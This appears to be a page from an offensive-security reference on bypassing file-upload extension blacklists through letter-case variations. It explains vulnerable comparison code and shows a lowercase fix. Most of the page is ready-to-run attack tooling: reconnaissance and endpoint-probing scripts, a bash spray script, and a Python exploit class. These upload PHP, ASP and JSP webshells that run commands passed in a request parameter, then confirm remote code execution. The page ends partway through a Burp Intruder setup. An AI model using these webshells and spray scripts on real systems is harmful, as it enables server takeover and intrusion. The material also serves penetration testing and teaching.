---
title: Case-Sensitive Extension Bypass
description: Case-Sensitive Extension Bypass — Exploit Case Handling Mismatches in File Upload Validation
navigation:
  icon: i-lucide-case-sensitive
  title: Case-Sensitive Extension Bypass
---

## Case-Sensitive Extension Bypass

::badge
**High Severity — CWE-178 / CWE-434 / CWE-183**
::

::note
Case-Sensitive Extension Bypass exploits the fundamental mismatch between **how the application validates file extensions** and **how the web server interprets them**. When a blacklist blocks `.php` but the developer uses a case-sensitive string comparison, uploading `.PHP`, `.pHp`, `.Php`, or `.pHP` bypasses the filter entirely. The web server (Apache with `mod_php`, IIS, or misconfigured Nginx) then executes the file regardless of case — because operating systems and server handlers often treat extensions case-insensitively. This is one of the simplest yet most frequently successful file upload bypasses in real-world bug bounty hunting.
::

---

## Vulnerability Anatomy

::accordion
  :::accordion-item{icon="i-lucide-cpu" label="How Case-Sensitive Bypass Works"}
  1. Application receives uploaded file with filename `shell.pHp`
  2. Server-side validation extracts extension: `.pHp`
  3. Blacklist comparison checks: `".pHp" == ".php"` → **FALSE** (case-sensitive)
  4. Upload passes validation — file is stored as `shell.pHp`
  5. Web server receives request for `shell.pHp`
  6. Apache/IIS handler matches `.pHp` → treats as PHP (case-insensitive matching)
  7. PHP interpreter executes the file → **Remote Code Execution**

  **Root cause:** The validation layer performs case-sensitive comparison while the execution layer performs case-insensitive matching. This impedance mismatch is the vulnerability.
  :::

  :::accordion-item{icon="i-lucide-layers" label="Where Case Sensitivity Matters"}
  | Component | Case Behavior | Details |
  | --------- | ------------- | ------- |
  | **Linux filesystem** | Case-sensitive | `shell.php` ≠ `shell.PHP` (different files) |
  | **Windows filesystem (NTFS)** | Case-insensitive | `shell.php` = `shell.PHP` (same file) |
  | **macOS filesystem (APFS default)** | Case-insensitive | `shell.php` = `shell.PHP` (same file) |
  | **Apache mod_php** | Case-insensitive handler | `.PHP` `.pHp` `.Php` all execute as PHP |
  | **Apache AddType/AddHandler** | Depends on config | Default is case-insensitive on most distros |
  | **IIS** | Case-insensitive | `.ASP` `.aSp` `.Asp` all execute |
  | **Nginx** | Case-sensitive by default | But `location ~* \.php$` uses `~*` (insensitive) |
  | **PHP validation (strcmp)** | Case-sensitive | `"PHP" != "php"` |
  | **PHP validation (strcasecmp)** | Case-insensitive | `"PHP" == "php"` |
  | **Python (==)** | Case-sensitive | `".PHP" != ".php"` |
  | **Java (equals)** | Case-sensitive | `".PHP" != ".php"` |
  | **JavaScript (===)** | Case-sensitive | `".PHP" !== ".php"` |
  | **.NET (==)** | Case-sensitive | `".PHP" != ".php"` |
  | **Ruby (==)** | Case-sensitive | `".PHP" != ".php"` |
  | **Go (==)** | Case-sensitive | `".PHP" != ".php"` |
  :::

  :::accordion-item{icon="i-lucide-shield-alert" label="Vulnerable Code Patterns"}
  ```text
  ── PHP Blacklist (VULNERABLE) ──
  $blocked = ['.php', '.phtml', '.php5'];
  $ext = pathinfo($filename, PATHINFO_EXTENSION);
  if (in_array('.' . $ext, $blocked)) { die("Blocked"); }
  // '.pHp' is NOT in the array → bypass

  ── Python Blacklist (VULNERABLE) ──
  blocked = ['.php', '.jsp', '.asp']
  ext = os.path.splitext(filename)[1]
  if ext in blocked: raise Error("Blocked")
  # '.PHP' not in blocked → bypass

  ── Java Blacklist (VULNERABLE) ──
  List<String> blocked = Arrays.asList(".php", ".jsp");
  String ext = filename.substring(filename.lastIndexOf("."));
  if (blocked.contains(ext)) throw new Exception("Blocked");
  // ".Jsp" not in list → bypass

  ── Node.js Blacklist (VULNERABLE) ──
  const blocked = ['.php', '.asp', '.jsp'];
  const ext = path.extname(filename);
  if (blocked.includes(ext)) return res.status(400).send('Blocked');
  // '.PHP' not in array → bypass

  ── SAFE Implementation ──
  $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
  // Now '.PHP' becomes '.php' → caught by blacklist
  ```
  :::

  :::accordion-item{icon="i-lucide-target" label="Impact Scenarios"}
  | Impact | Scenario | Severity |
  | ------ | -------- | -------- |
  | **Remote Code Execution** | Upload `shell.pHp` → executes on Apache | Critical |
  | **Webshell Deployment** | Upload `cmd.PhP` → persistent backdoor | Critical |
  | **Server-Side Script Execution** | Upload `evil.AsP` on IIS | Critical |
  | **JSP Execution** | Upload `cmd.JsP` on Tomcat | Critical |
  | **SHTML/SSI Execution** | Upload `inject.sHtMl` → SSI injection | High |
  | **Configuration Override** | Upload `.HtAccEsS` on Apache | High |
  | **Template Injection** | Upload `template.PhTmL` → PHP execution | Critical |
  | **Stored XSS** | Upload `xss.HtMl` or `xss.SvG` | High |
  :::
::

---

## Extension Case Permutation Reference

::tip
Every character in the extension can be uppercase or lowercase, creating `2^n` permutations where `n` is the number of alphabetic characters. For `.php` (3 chars) that's 8 permutations. For `.phtml` (5 chars) that's 32. Your blacklist must catch ALL of them — or normalize to lowercase first.
::

### PHP Extension Permutations

::collapsible

| Extension | Permutations | Notes |
| --------- | ------------ | ----- |
| `.php` | `.php` `.phP` `.pHp` `.pHP` `.Php` `.PhP` `.PHp` `.PHP` | 8 permutations |
| `.phtml` | `.phtml` `.phtmL` `.phtMl` `.phtML` `.phTml` ... `.PHTML` | 32 permutations |
| `.php5` | `.php5` `.phP5` `.pHp5` `.pHP5` `.Php5` `.PhP5` `.PHp5` `.PHP5` | 8 permutations |
| `.php7` | `.php7` `.phP7` `.pHp7` `.pHP7` `.Php7` `.PhP7` `.PHp7` `.PHP7` | 8 permutations |
| `.php4` | `.php4` `.phP4` `.pHp4` `.pHP4` `.Php4` `.PhP4` `.PHp4` `.PHP4` | 8 permutations |
| `.pht` | `.pht` `.phT` `.pHt` `.pHT` `.Pht` `.PhT` `.PHt` `.PHT` | 8 permutations |
| `.phps` | `.phps` `.phpS` `.phPs` `.phPS` `.pHps` ... `.PHPS` | 16 permutations |
| `.phar` | `.phar` `.phaR` `.phAr` `.phAR` `.pHar` ... `.PHAR` | 16 permutations |
| `.inc` | `.inc` `.inC` `.iNc` `.iNC` `.Inc` `.InC` `.INc` `.INC` | 8 permutations |
| `.module` | 64 permutations | 6 alpha chars |

::

### Other Language Extension Permutations

::collapsible

| Language | Extension | Key Permutations |
| -------- | --------- | ---------------- |
| **ASP Classic** | `.asp` | `.aSp` `.AsP` `.ASP` `.Asp` `.ASp` `.asP` `.aSP` |
| **ASP.NET** | `.aspx` | `.aSpX` `.AsPx` `.ASPX` `.Aspx` `.aSPx` `.aspX` |
| **ASP.NET** | `.ashx` | `.aShX` `.AsHx` `.ASHX` `.Ashx` |
| **ASP.NET** | `.asmx` | `.aSmX` `.AsMx` `.ASMX` |
| **ASP.NET** | `.ascx` | `.aScX` `.AsCx` `.ASCX` |
| **JSP** | `.jsp` | `.jSp` `.JsP` `.JSP` `.Jsp` `.JSp` `.jsP` `.jSP` |
| **JSP** | `.jspx` | `.jSpX` `.JsPx` `.JSPX` `.Jspx` |
| **Servlet** | `.jsw` | `.jSw` `.JsW` `.JSW` |
| **Servlet** | `.jsv` | `.jSv` `.JsV` `.JSV` |
| **ColdFusion** | `.cfm` | `.cFm` `.CfM` `.CFM` `.Cfm` `.CFm` `.cfM` `.cFM` |
| **ColdFusion** | `.cfml` | `.cFmL` `.CfMl` `.CFML` |
| **Perl** | `.pl` | `.pL` `.Pl` `.PL` |
| **Perl** | `.cgi` | `.cGi` `.CgI` `.CGI` `.Cgi` `.CGi` `.cgI` |
| **Python** | `.py` | `.pY` `.Py` `.PY` |
| **Ruby** | `.rb` | `.rB` `.Rb` `.RB` |
| **SSI** | `.shtml` | `.sHtMl` `.SHTML` `.Shtml` `.ShtmL` |
| **Config** | `.htaccess` | `.HtAcCeSs` `.HTACCESS` `.Htaccess` |
| **HTML** | `.html` | `.hTmL` `.HTML` `.Html` `.HTml` |
| **SVG** | `.svg` | `.sVg` `.SvG` `.SVG` `.Svg` |

::

---

## Reconnaissance & Target Analysis

### Server & Filesystem Detection

::tabs
  :::tabs-item{icon="i-lucide-radar" label="Server Fingerprinting"}
  ```bash
  # ── Identify web server and OS (determines case sensitivity behavior) ──

  # HTTP headers
  curl -sI https://target.com | grep -iE "^server:|^x-powered-by:|^x-aspnet"

  # Server identification
  whatweb https://target.com -v 2>/dev/null | head -5
  wappalyzer https://target.com 2>/dev/null

  # ── Determine OS (filesystem case sensitivity) ──

  # Case sensitivity test via URL
  # Request the same resource with different cases
  STATUS_LOWER=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/index.html")
  STATUS_UPPER=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/INDEX.HTML")
  STATUS_MIXED=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/Index.Html")

  echo "[*] Filesystem case sensitivity test:"
  echo "    /index.html  → ${STATUS_LOWER}"
  echo "    /INDEX.HTML  → ${STATUS_UPPER}"
  echo "    /Index.Html  → ${STATUS_MIXED}"

  if [ "$STATUS_LOWER" = "$STATUS_UPPER" ] && [ "$STATUS_LOWER" = "$STATUS_MIXED" ]; then
      echo "[+] Case-INSENSITIVE filesystem (Windows/macOS likely)"
      echo "[*] Shell uploaded as .PHP will be found as .php too"
  elif [ "$STATUS_LOWER" != "$STATUS_UPPER" ]; then
      echo "[+] Case-SENSITIVE filesystem (Linux likely)"
      echo "[*] Shell uploaded as .PHP must be accessed as .PHP"
  fi

  # ── Identify handler configuration ──

  # Apache: Check if mod_php handles case-insensitive
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/nonexistent.PHP" 2>/dev/null
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/nonexistent.pHp" 2>/dev/null
  # 403 or 500 = server recognizes it as PHP (handler active)
  # 404 = server doesn't recognize extension (handler not matching)

  # IIS: Always case-insensitive
  curl -sI https://target.com | grep -i "Microsoft-IIS" && echo "[+] IIS detected — case-insensitive handlers"

  # Nginx: Check location block case sensitivity
  # ~  = case-sensitive regex
  # ~* = case-insensitive regex
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/test.PHP" 2>/dev/null
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/test.pHp" 2>/dev/null
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Validation Type Detection"}
  ```bash
  # ── Determine if target uses blacklist or whitelist, and case handling ──

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=AUTH_TOKEN"
  FIELD="file"

  echo "═══ Extension Validation Detection ═══"

  # Test 1: Is there ANY extension validation?
  echo "test" > /tmp/test.txt
  echo '<?php echo "test"; ?>' > /tmp/test.php

  STATUS_TXT=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/test.txt;filename=test.txt" -H "Cookie: $COOKIE")
  STATUS_PHP=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/test.php;filename=test.php" -H "Cookie: $COOKIE")

  echo "[*] .txt upload: ${STATUS_TXT}"
  echo "[*] .php upload: ${STATUS_PHP}"

  if [ "$STATUS_TXT" = "$STATUS_PHP" ] && [ "$STATUS_TXT" = "200" ]; then
      echo "[+] NO extension validation detected — direct .php upload works!"
      exit 0
  fi

  # Test 2: Blacklist or whitelist?
  STATUS_RANDOM=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/test.txt;filename=test.xyz123" -H "Cookie: $COOKIE")

  echo "[*] .xyz123 (random ext): ${STATUS_RANDOM}"

  if [ "$STATUS_RANDOM" = "200" ]; then
      echo "[+] BLACKLIST detected — unknown extensions allowed"
      echo "[*] Try case variations of blocked extensions"
  else
      echo "[+] WHITELIST detected — only specific extensions allowed"
      echo "[*] Try case variations of whitelisted extensions + double ext"
  fi

  # Test 3: Case sensitivity of validation
  echo ""
  echo "─── Case Sensitivity Test ───"

  for ext in php PHP pHp Php PhP pHP PHp phP; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/test.php;filename=test.${ext}" -H "Cookie: $COOKIE")
      INDICATOR=" "
      [ "$STATUS" = "200" ] && INDICATOR="+"
      echo "[${INDICATOR}] [${STATUS}] .${ext}"
  done

  echo ""
  echo "─── Alternative Extension Case Test ───"

  for ext in phtml PHTML pHtMl Phtml \
             php5 PHP5 pHp5 Php5 \
             php7 PHP7 pHp7 \
             pht PHT pHt PhT \
             phps PHPS pHpS \
             phar PHAR pHaR \
             inc INC iNc; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/test.php;filename=test.${ext}" -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] ACCEPTED: .${ext}"
  done

  rm -f /tmp/test.txt /tmp/test.php
  ```
  :::

  :::tabs-item{icon="i-lucide-microscope" label="Handler Execution Test"}
  ```bash
  # ── After upload succeeds, verify the server EXECUTES the extension ──

  TARGET="https://target.com"
  UPLOAD_URL="${TARGET}/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  MARKER="CASE_BYPASS_$(date +%s)"

  echo "═══ Handler Execution Verification ═══"

  # Create PHP test file
  echo "<?php echo '${MARKER}'; ?>" > /tmp/case_test.txt

  # Upload with each case variant and check execution
  for ext in pHp PhP PHP Php pHP PHp phP \
             pHtMl PHTML Phtml phtmL \
             pHp5 PHP5 Php5 \
             pHt PHT PhT \
             pHaR PHAR; do

      # Upload
      RESP=$(curl -s -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/case_test.txt;filename=case_test_${ext}.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE")

      STATUS=$(echo "$RESP" | head -1)

      # Try to access and check execution
      for dir in "" "uploads/" "files/" "media/" "images/" "static/"; do
          CHECK_URL="${TARGET}/${dir}case_test_${ext}.${ext}"
          RESULT=$(curl -s "$CHECK_URL" 2>/dev/null)

          if echo "$RESULT" | grep -q "$MARKER"; then
              echo "[+] EXECUTED: .${ext} at ${CHECK_URL}"
              echo "    → Server executes .${ext} as PHP!"
          elif [ "$(curl -s -o /dev/null -w '%{http_code}' "$CHECK_URL")" = "200" ]; then
              # File exists but PHP not executed — check content
              if echo "$RESULT" | grep -q "<?php"; then
                  echo "[~] EXISTS but NOT executed: .${ext} (source visible)"
              fi
          fi
      done
  done

  rm -f /tmp/case_test.txt
  ```
  :::
::

### Upload Endpoint Discovery

::code-group
```bash [Automated Crawling]
# ── Find all upload endpoints ──

katana -u https://target.com -d 5 -jc -kf -ef css,woff,woff2 -o crawl.txt
grep -iE "upload|attach|import|avatar|profile|media|image|photo|file|document|logo|banner|cover" crawl.txt | sort -u > upload_endpoints.txt

# GAU + Wayback
echo "target.com" | gau --threads 10 | grep -iE "upload|attach|file|image|media" | sort -u >> upload_endpoints.txt

# Parameter discovery
arjun -u https://target.com/upload -m POST -t 20

# Ffuf endpoint brute force
ffuf -u https://target.com/FUZZ -w <(cat << 'WORDLIST'
upload
upload.php
api/upload
api/v1/upload
api/v2/upload
api/files
api/media
api/images
api/attachments
admin/upload
admin/media
user/avatar
profile/photo
settings/logo
editor/upload
ckeditor/upload
tinymce/upload
elfinder/connector
filemanager/upload
WORDLIST
) -mc 200,301,302,401,403,405
```

```bash [Manual Endpoint Testing]
# ── Probe common upload paths ──
for endpoint in \
    "/upload" "/api/upload" "/api/v1/upload" "/api/v2/files" \
    "/api/files/upload" "/api/media" "/api/images" "/api/attachments" \
    "/admin/upload" "/admin/media" "/admin/files" "/user/avatar" \
    "/profile/photo" "/settings/logo" "/editor/upload" "/media/upload" \
    "/attachment/add" "/file/new" "/content/upload" "/asset/upload"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
      "https://target.com${endpoint}" 2>/dev/null)
    [ "$STATUS" != "404" ] && [ "$STATUS" != "000" ] && \
      echo "[${STATUS}] POST https://target.com${endpoint}"
done
```
::

---

## Exploitation — Core Techniques

### Extension Case Permutation Generator

::tabs
  :::tabs-item{icon="i-lucide-code" label="Python Permutation Generator"}
  ```python [case_permutation_generator.py]
  #!/usr/bin/env python3
  """
  Generate all case permutations of file extensions.
  For n alphabetic characters, generates 2^n variants.
  """
  import itertools
  import sys

  def case_permutations(extension):
      """Generate all case permutations of an extension"""
      if extension.startswith('.'):
          prefix = '.'
          ext = extension[1:]
      else:
          prefix = ''
          ext = extension

      # Separate alpha and non-alpha characters
      results = ['']
      for char in ext:
          if char.isalpha():
              new_results = []
              for r in results:
                  new_results.append(r + char.lower())
                  new_results.append(r + char.upper())
              results = new_results
          else:
              results = [r + char for r in results]

      return [prefix + r for r in results]

  # ── PHP Extensions ──
  php_extensions = [
      '.php', '.phtml', '.php5', '.php7', '.php4',
      '.pht', '.phps', '.phar', '.pgif', '.inc',
      '.php3', '.phtm'
  ]

  # ── ASP/ASPX Extensions ──
  asp_extensions = [
      '.asp', '.aspx', '.asa', '.cer', '.ashx',
      '.asmx', '.ascx', '.cshtml', '.vbhtml'
  ]

  # ── JSP Extensions ──
  jsp_extensions = [
      '.jsp', '.jspx', '.jsw', '.jsv', '.jspf'
  ]

  # ── Other Server-Side Extensions ──
  other_extensions = [
      '.cfm', '.cfml', '.cfc',  # ColdFusion
      '.pl', '.cgi', '.pm',     # Perl
      '.py', '.rb',             # Python, Ruby
      '.shtml', '.stm',         # SSI
      '.htaccess',              # Apache config
      '.svg', '.html', '.htm',  # XSS vectors
  ]

  def generate_for_extensions(ext_list, label):
      """Generate and print all permutations for a list of extensions"""
      print(f"\n═══ {label} ═══")
      total = 0
      for ext in ext_list:
          perms = case_permutations(ext)
          total += len(perms)
          print(f"\n  {ext} ({len(perms)} permutations):")
          # Print in rows of 8
          for i in range(0, len(perms), 8):
              print(f"    {', '.join(perms[i:i+8])}")
      print(f"\n  Total: {total} permutations")
      return total

  generate_for_extensions(php_extensions, "PHP Extensions")
  generate_for_extensions(asp_extensions, "ASP/ASPX Extensions")
  generate_for_extensions(jsp_extensions, "JSP Extensions")
  generate_for_extensions(other_extensions, "Other Extensions")

  # ── Save to wordlist file ──
  all_extensions = php_extensions + asp_extensions + jsp_extensions + other_extensions
  all_perms = []
  for ext in all_extensions:
      all_perms.extend(case_permutations(ext))

  with open('case_permutation_wordlist.txt', 'w') as f:
      for perm in all_perms:
          f.write(perm.lstrip('.') + '\n')

  print(f"\n[+] Saved {len(all_perms)} permutations to case_permutation_wordlist.txt")

  # ── Generate specific extension ──
  if len(sys.argv) > 1:
      target_ext = sys.argv[1]
      perms = case_permutations(target_ext)
      print(f"\n[*] Permutations for {target_ext}:")
      for p in perms:
          print(f"  {p}")
      print(f"[+] Total: {len(perms)}")
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Bash One-Liner Generators"}
  ```bash
  # ── Quick case permutation generators ──

  # Python one-liner for .php permutations
  python3 -c "
  from itertools import product
  ext='php'
  for combo in product(*[(c.lower(),c.upper()) for c in ext]):
      print('.'+''.join(combo))
  "

  # Generate .phtml permutations
  python3 -c "
  from itertools import product
  for combo in product(*[(c.lower(),c.upper()) for c in 'phtml']):
      print('.'+''.join(combo))
  " > phtml_permutations.txt
  echo "[+] $(wc -l < phtml_permutations.txt) .phtml permutations"

  # Bash-native permutation (for .php)
  for a in p P; do
      for b in h H; do
          for c in p P; do
              echo ".${a}${b}${c}"
          done
      done
  done

  # Generate comprehensive extension wordlist
  python3 -c "
  from itertools import product
  extensions = ['php','phtml','php5','php7','pht','phar','phps',
                'asp','aspx','ashx','asa','cer',
                'jsp','jspx','jsw','jsv',
                'cfm','cfml','cgi','pl',
                'shtml','svg','html']
  for ext in extensions:
      for combo in product(*[(c.lower(),c.upper()) if c.isalpha() else (c,) for c in ext]):
          print(''.join(combo))
  " | sort -u > all_case_extensions.txt
  echo "[+] Generated $(wc -l < all_case_extensions.txt) case permutations"

  # Generate with shell prefix for quick upload testing
  python3 -c "
  from itertools import product
  for combo in product(*[(c.lower(),c.upper()) for c in 'php']):
      ext = ''.join(combo)
      print(f'shell.{ext}')
  "
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="CyberChef / Manual Lists"}
  ```text
  # ═══ Pre-built case permutation lists ═══

  # ── .php (8 variants) ──
  .php
  .phP
  .pHp
  .pHP
  .Php
  .PhP
  .PHp
  .PHP

  # ── .phtml (32 variants — most useful ones) ──
  .phtml
  .pHtml
  .phTml
  .phTmL
  .pHTML
  .Phtml
  .PHTML
  .pHtMl
  .pHtML
  .PhTmL
  .PHtml
  .PHtMl

  # ── .asp (8 variants) ──
  .asp
  .asP
  .aSp
  .aSP
  .Asp
  .AsP
  .ASp
  .ASP

  # ── .aspx (16 variants — most useful) ──
  .aspx
  .aspX
  .asPx
  .asPX
  .aSpx
  .aSPx
  .Aspx
  .ASpx
  .AsPx
  .ASPX

  # ── .jsp (8 variants) ──
  .jsp
  .jsP
  .jSp
  .jSP
  .Jsp
  .JsP
  .JSp
  .JSP

  # ── .htaccess (256+ variants — key ones) ──
  .htaccess
  .Htaccess
  .hTaccess
  .htAccess
  .htaCcess
  .HTACCESS
  .HtAcCeSs
  .HTAccess
  ```
  :::
::

### Upload Exploitation

::tabs
  :::tabs-item{icon="i-lucide-upload" label="cURL Mass Case Spray"}
  ```bash
  #!/bin/bash
  # case_bypass_spray.sh — Spray all case permutations against upload endpoint

  UPLOAD_URL="${1:-https://target.com/api/upload}"
  COOKIE="${2:-session=AUTH_TOKEN}"
  FIELD="${3:-file}"
  SHELL_CONTENT='<?php echo "CASE_BYPASS_POC_".php_uname(); system($_GET["cmd"]); ?>'

  echo "═══════════════════════════════════════════"
  echo " Case-Sensitive Extension Bypass Sprayer"
  echo "═══════════════════════════════════════════"
  echo "[*] Target: $UPLOAD_URL"
  echo ""

  # Generate PHP shell
  echo "$SHELL_CONTENT" > /tmp/case_shell.txt

  ACCEPTED=()
  EXECUTED=()

  # ── PHP case permutations ─��
  PHP_PERMS=$(python3 -c "
  from itertools import product
  exts = ['php','phtml','php5','php7','pht','phps','phar']
  for ext in exts:
      for combo in product(*[(c.lower(),c.upper()) if c.isalpha() else (c,) for c in ext]):
          print(''.join(combo))
  " 2>/dev/null)

  # Fallback if Python not available
  if [ -z "$PHP_PERMS" ]; then
      PHP_PERMS="php phP pHp pHP Php PhP PHp PHP phtml PHTML pHtMl Phtml php5 PHP5 pHp5 Php5 pht PHT pHt PhT phar PHAR pHaR"
  fi

  TOTAL=$(echo "$PHP_PERMS" | wc -w)
  COUNT=0

  for ext in $PHP_PERMS; do
      COUNT=$((COUNT + 1))

      # Upload with this extension
      FILENAME="shell_${ext}.${ext}"
      RESP=$(curl -s -o /tmp/case_resp_$$.txt -w "%{http_code}" \
        -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/case_shell.txt;filename=${FILENAME};type=image/jpeg" \
        -H "Cookie: $COOKIE" 2>/dev/null)

      RESP_BODY=$(cat /tmp/case_resp_$$.txt 2>/dev/null)
      SUCCESS=$(echo "$RESP_BODY" | grep -ciE "success|upload|saved|created|url|path")

      if [ "$RESP" = "200" ] && [ "$SUCCESS" -gt 0 ]; then
          ACCEPTED+=("$ext")
          echo "[+] ACCEPTED: .${ext} (${COUNT}/${TOTAL})"

          # Extract URL if in response
          UPLOAD_PATH=$(echo "$RESP_BODY" | grep -oP '"(url|path|file|location)"\s*:\s*"([^"]*)"' | head -1 | grep -oP '"[^"]*"$' | tr -d '"')
          [ -n "$UPLOAD_PATH" ] && echo "    URL: ${UPLOAD_PATH}"
      else
          # Show progress every 20
          [ $((COUNT % 20)) -eq 0 ] && echo "[*] Progress: ${COUNT}/${TOTAL}..."
      fi

      sleep 0.2
  done

  echo ""
  echo "═══ Results ═══"
  echo "[*] Total tested: ${TOTAL}"
  echo "[+] Accepted: ${#ACCEPTED[@]}"

  if [ ${#ACCEPTED[@]} -gt 0 ]; then
      echo ""
      echo "[+] Accepted extensions:"
      for ext in "${ACCEPTED[@]}"; do
          echo "    .${ext}"
      done
  fi

  rm -f /tmp/case_shell.txt /tmp/case_resp_$$.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Python Exploit Script"}
  ```python [case_bypass_exploit.py]
  #!/usr/bin/env python3
  """
  Case-Sensitive Extension Bypass Exploit
  Generates all case permutations and tests each against the upload endpoint
  """
  import requests
  import itertools
  import time
  import sys
  import re
  import urllib3
  urllib3.disable_warnings()

  class CaseBypassExploit:
      def __init__(self, upload_url, field="file", cookies=None, headers=None):
          self.upload_url = upload_url
          self.field = field
          self.session = requests.Session()
          self.session.verify = False
          if cookies:
              self.session.cookies.update(cookies)
          if headers:
              self.session.headers.update(headers)

          self.accepted = []
          self.executed = []

      @staticmethod
      def case_permutations(ext):
          """Generate all case permutations of extension"""
          if ext.startswith('.'):
              ext = ext[1:]
          chars = []
          for c in ext:
              if c.isalpha():
                  chars.append([c.lower(), c.upper()])
              else:
                  chars.append([c])
          return ['.' + ''.join(combo) for combo in itertools.product(*chars)]

      def get_baseline(self):
          """Get baseline response for comparison"""
          # Upload a harmless text file
          files = {self.field: ("test.txt", b"test content", "text/plain")}
          try:
              r = self.session.post(self.upload_url, files=files, timeout=15)
              return {'status': r.status_code, 'size': len(r.text), 'text': r.text}
          except:
              return None

      def upload(self, content, filename, content_type="application/octet-stream"):
          """Upload a single file"""
          files = {self.field: (filename, content, content_type)}
          try:
              r = self.session.post(self.upload_url, files=files, timeout=15)
              return r
          except Exception as e:
              return None

      def check_execution(self, base_url, filename, marker):
          """Check if uploaded file executes"""
          dirs = ['', 'uploads/', 'files/', 'media/', 'images/', 'static/',
                  'assets/', 'content/', 'upload/', 'data/', 'public/']

          for d in dirs:
              url = f"{base_url}/{d}{filename}"
              try:
                  r = self.session.get(url, params={'cmd': 'echo ' + marker}, timeout=5)
                  if marker in r.text:
                      return url, r.text
                  # Check if PHP was executed (no source visible)
                  if '<?php' not in r.text and r.status_code == 200 and len(r.text) > 0:
                      if 'CASE_BYPASS' in r.text:
                          return url, r.text
              except:
                  continue
          return None, None

      def spray(self, extensions=None, shell_code=None, delay=0.3):
          """Spray all case permutations"""
          if extensions is None:
              extensions = ['.php', '.phtml', '.php5', '.php7', '.pht',
                           '.phps', '.phar', '.inc', '.pgif', '.shtml']

          if shell_code is None:
              shell_code = b'<?php echo "CASE_BYPASS_POC"; system($_GET["cmd"]); ?>'

          all_perms = []
          for ext in extensions:
              all_perms.extend(self.case_permutations(ext))

          # Remove the lowercase originals (likely already blocked)
          # Keep them at the end for completeness
          original_lower = [e.lower() for e in extensions]
          priority_perms = [p for p in all_perms if p.lower() not in [e.lower() for e in extensions] or p != p.lower()]
          lower_perms = [p for p in all_perms if p == p.lower()]
          ordered_perms = priority_perms + lower_perms

          print(f"[*] Target: {self.upload_url}")
          print(f"[*] Testing {len(ordered_perms)} case permutations")
          print(f"[*] Base extensions: {', '.join(extensions)}")
          print("-" * 60)

          for i, ext in enumerate(ordered_perms):
              filename = f"shell{ext}"

              # Try with different Content-Types
              for ct in ['image/jpeg', 'application/octet-stream', 'image/png']:
                  r = self.upload(shell_code, filename, ct)

                  if r and r.status_code in [200, 201]:
                      # Check for success indicators
                      success = any(w in r.text.lower() for w in
                          ['success', 'upload', 'saved', 'created', 'url', 'path', 'file'])

                      if success:
                          self.accepted.append({
                              'ext': ext, 'filename': filename,
                              'ct': ct, 'response': r.text[:300]
                          })
                          print(f"[+] ACCEPTED: {filename} (CT: {ct})")

                          # Try to find and verify execution
                          base = self.upload_url.rsplit('/', 2)[0]
                          url, output = self.check_execution(base, filename, "CASE_BYPASS_POC")
                          if url:
                              self.executed.append({
                                  'ext': ext, 'url': url, 'output': output[:200]
                              })
                              print(f"    [!!!] EXECUTED at: {url}")

                          break  # Don't need to try other CTs

                  time.sleep(delay / 3)

              if (i + 1) % 25 == 0:
                  print(f"[*] Progress: {i+1}/{len(ordered_perms)}")

              time.sleep(delay)

          self._report()

      def spray_asp(self, delay=0.3):
          """Spray ASP/ASPX case permutations"""
          extensions = ['.asp', '.aspx', '.asa', '.cer', '.ashx', '.asmx']
          shell = b'<%eval request("cmd")%>'
          self.spray(extensions, shell, delay)

      def spray_jsp(self, delay=0.3):
          """Spray JSP case permutations"""
          extensions = ['.jsp', '.jspx', '.jsw', '.jsv', '.jspf']
          shell = b'<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'
          self.spray(extensions, shell, delay)

      def _report(self):
          """Print results summary"""
          print(f"\n{'='*60}")
          print(f"RESULTS SUMMARY")
          print(f"{'='*60}")
          print(f"Accepted uploads: {len(self.accepted)}")
          print(f"Confirmed execution: {len(self.executed)}")

          if self.accepted:
              print(f"\n[+] Accepted extensions:")
              for a in self.accepted:
                  print(f"    {a['ext']:12s} — CT: {a['ct']}")

          if self.executed:
              print(f"\n[!!!] CONFIRMED RCE:")
              for e in self.executed:
                  print(f"    Extension: {e['ext']}")
                  print(f"    URL: {e['url']}")
                  print(f"    Output: {e['output'][:100]}")
                  print()

  if __name__ == "__main__":
      exploit = CaseBypassExploit(
          upload_url="https://target.com/api/upload",
          field="file",
          cookies={"session": "AUTH_TOKEN"},
      )

      # PHP spray
      exploit.spray(delay=0.3)

      # ASP spray (uncomment for IIS targets)
      # exploit.spray_asp(delay=0.3)

      # JSP spray (uncomment for Java targets)
      # exploit.spray_jsp(delay=0.3)
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Burp Intruder Setup"}
  ```text
  # ═══ Burp Suite Intruder — Case Permutation Attack ═══

  # 1. Capture upload request in Proxy
  # 2. Send to Intruder

  # 3. Set Attack Type: Sniper
  # 4. Set Position on filename extension:

  POST /api/upload HTTP/1.1
  Host: target.com
  Cookie: session=AUTH_TOKEN
  Content-Type: multipart/form-data; boundary=----Boundary

  ------Boundary
  Content-Disposition: form-data; name="file"; filename="shell.§php§"
